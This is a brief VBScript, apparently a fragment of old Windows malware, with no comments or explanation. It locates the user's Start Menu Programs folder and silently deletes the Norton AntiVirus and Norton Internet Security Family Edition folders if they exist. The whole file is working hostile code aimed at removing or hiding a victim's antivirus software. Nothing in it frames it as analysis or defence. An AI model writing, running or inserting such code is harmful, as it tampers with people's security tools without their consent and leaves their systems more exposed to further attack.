Set WShell = createobject ("Wscript.shell")
Set fs = createobject ("scripting.filesystemobject")

set ospecfolder = wshell.SpecialFolders

rep = ospecfolder ("Programs") & ("\Norton AntiVirus")
if fs.folderExists (rep)=true then
fs.deleteFolder (rep)
end if


rep1 = ospecfolder ("Programs") & ("\Norton Internet Security Family Edition")
if fs.folderExists (rep1)=true then
fs.deleteFolder (rep1)
end if



